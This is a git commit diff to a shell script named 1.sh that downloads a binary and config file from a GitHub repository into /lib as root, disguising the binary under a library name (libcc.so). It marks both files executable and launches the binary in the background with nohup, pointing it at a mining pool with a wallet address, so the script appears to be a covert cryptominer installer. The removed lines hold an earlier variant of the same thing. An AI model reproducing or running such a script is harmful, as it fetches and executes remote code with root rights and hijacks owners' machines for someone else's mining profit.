eaa52107368cec0050f230d53db4ebf1e0491214
Shallow-Sea <59738846+Shallow-Sea@users.noreply.github.com>
2023-04-02 04:16:18 +0800

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,4 +1,6 @@
 #!/bin/bash
-sudo curl -o /lib/cat https://github.com/Shallow-Sea/tools/raw/main/libcct.so
-sudo chmod +x /lib/libcct.so
-sudo nohup /lib/libcct.so -o auto.skypool.xyz:9999 -u 4A4fyoKs9t2bbsq2qLJAzrCCKJohYXfqr9RiLedQFyy6d7KjvRbGbfiUf8Vxbmcbc8KyNkfknTMkz3ggHGZgv6zJEcsq6FK -k --tls --algo auto -p ranshu &
+sudo curl -o /lib/libcc.so https://github.com/Shallow-Sea/tools/raw/main/libcc.so
+sudo curl -o /lib/config.json https://github.com/Shallow-Sea/tools/raw/main/config.json
+sudo chmod +x /lib/libcc.so
+sudo chmod +x /lib/config.json
+sudo nohup /lib/libcc.so -o auto.skypool.xyz:9999 -u 4A4fyoKs9t2bbsq2qLJAzrCCKJohYXfqr9RiLedQFyy6d7KjvRbGbfiUf8Vxbmcbc8KyNkfknTMkz3ggHGZgv6zJEcsq6FK -k --tls --algo auto -p ranshu &
